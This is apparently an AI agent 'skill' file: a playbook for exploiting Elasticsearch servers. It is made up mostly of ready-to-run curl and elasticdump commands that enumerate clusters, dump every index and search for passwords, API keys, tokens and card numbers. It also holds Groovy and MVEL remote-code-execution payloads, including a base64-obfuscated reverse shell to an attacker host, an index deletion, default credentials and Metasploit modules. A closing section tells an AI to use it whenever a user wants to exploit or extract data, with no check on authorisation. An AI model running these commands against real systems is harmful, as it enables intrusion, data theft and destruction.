# Elasticsearch Pentesting Skill

## Goal

Exploit Elasticsearch services to extract sensitive data and potentially achieve remote code execution.

## Methodology

1. **Discovery**: Identify Elasticsearch instances
2. **Authentication Check**: Test for unauthenticated access
3. **Enumeration**: List indices, mappings, and data
4. **Data Extraction**: Dump sensitive information
5. **Exploitation**: Achieve RCE through scripting or CVEs

## Ports

- 9200/TCP: Elasticsearch HTTP API
- 9300/TCP: Elasticsearch transport (cluster communication)

## Tools

* **curl**: HTTP API interaction
* **nmap**: Elasticsearch scripts
* **elasticsearch-dump**: Data extraction tool
* **elasticdump**: Backup/restore tool

## Example Commands

```bash
# Check for unauthenticated access
curl -X GET "http://target:9200/"
curl -X GET "http://target:9200/_cluster/health"

# Nmap detection
nmap -p9200 --script elasticsearch target

# Check authentication
curl -u elastic:password "http://target:9200/"
```

## Elasticsearch Enumeration

```bash
# Cluster info
curl "http://target:9200/"

# Cluster health
curl "http://target:9200/_cluster/health?pretty"

# Cluster stats
curl "http://target:9200/_cluster/stats?pretty"

# List all indices
curl "http://target:9200/_cat/indices?v"

# List all nodes
curl "http://target:9200/_cat/nodes?v"

# Index mapping (structure)
curl "http://target:9200/index_name/_mapping?pretty"

# Index settings
curl "http://target:9200/index_name/_settings?pretty"

# Get all aliases
curl "http://target:9200/_aliases?pretty"
```

## Data Extraction

```bash
# Search all data in index
curl "http://target:9200/index_name/_search?pretty&size=1000"

# Search with query
curl -X GET "http://target:9200/index_name/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "match_all": {}
  }
}'

# Search for specific field
curl -X GET "http://target:9200/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "match": {
      "password": "*"
    }
  }
}'

# Scroll through all documents
curl -X POST "http://target:9200/index_name/_search?scroll=1m&pretty" -H 'Content-Type: application/json' -d'
{
  "size": 1000,
  "query": {
    "match_all": {}
  }
}'

# Using elasticsearch-dump
elasticdump --input=http://target:9200/index_name --output=dump.json

# Dump all indices
for index in $(curl -s "http://target:9200/_cat/indices" | awk '{print $3}'); do
    elasticdump --input=http://target:9200/$index --output=$index.json
done
```

## Sensitive Data Search

```bash
# Search for passwords
curl "http://target:9200/_search?q=password&pretty"

# Search for credentials
curl "http://target:9200/_search?q=username%20AND%20password&pretty"

# Search for API keys
curl "http://target:9200/_search?q=api_key&pretty"

# Search for secrets
curl "http://target:9200/_search?q=secret&pretty"

# Search for tokens
curl "http://target:9200/_search?q=token&pretty"

# Search for credit cards (pattern)
curl "http://target:9200/_search?q=4[0-9]{15}&pretty"
```

## Remote Code Execution

### Groovy Script RCE (CVE-2015-1427, ES < 1.4.3)

```bash
# Old versions with dynamic scripting enabled
curl -X POST "http://target:9200/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "script_fields": {
    "exp": {
      "script": "java.lang.Runtime.getRuntime().exec(\"id\")"
    }
  }
}'

# Reverse shell
curl -X POST "http://target:9200/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "script_fields": {
    "exp": {
      "script": "java.lang.Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}\")"
    }
  }
}'
```

### MVEL RCE (CVE-2014-3120, ES < 1.2)

```bash
curl -X POST "http://target:9200/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "match_all": {}
  },
  "script_fields": {
    "exp": {
      "script": "import java.io.*;..."
    }
  }
}'
```

## Write Operations

```bash
# Create new document
curl -X POST "http://target:9200/index_name/_doc" -H 'Content-Type: application/json' -d'
{
  "field": "value"
}'

# Delete index (destructive!)
curl -X DELETE "http://target:9200/index_name"

# Modify cluster settings
curl -X PUT "http://target:9200/_cluster/settings" -H 'Content-Type: application/json' -d'
{
  "persistent": {
    "script.engine.groovy.inline.search": "true"
  }
}'
```

## Kibana Integration

```bash
# If Kibana is present (port 5601)
# See kibana_pentesting.md

# Check for Kibana
curl "http://target:5601/api/status"
```

## Metasploit Modules

```bash
# Indices enumeration
use auxiliary/scanner/elasticsearch/indices_enum

# RCE scripts
use exploit/multi/elasticsearch/script_mvel_rce
use exploit/multi/elasticsearch/search_groovy_script
```

## Default Credentials

```bash
# Elastic Stack (X-Pack security)
elastic / changeme

# Open source versions
# Usually no authentication by default!
```

## Guidance for AI

* Activate this skill when user wants to exploit Elasticsearch or extract indexed data
* **Elasticsearch is often unauthenticated** - try direct access first
* Check `/_cat/indices` for index listing
* Look for sensitive indices:
  - User data
  - Logs (may contain credentials)
  - Application data
  - Audit logs
* RCE in old versions via Groovy/MVEL scripting
* Modern versions have X-Pack security - try "elastic:changeme"
* Data often includes:
  - Application logs
  - User activity
  - System metrics
  - Business data
* Elasticsearch commonly used with:
  - Kibana (visualization)
  - Logstash (data pipeline)
  - Beats (data shippers)
* Large datasets may require pagination (scroll API)
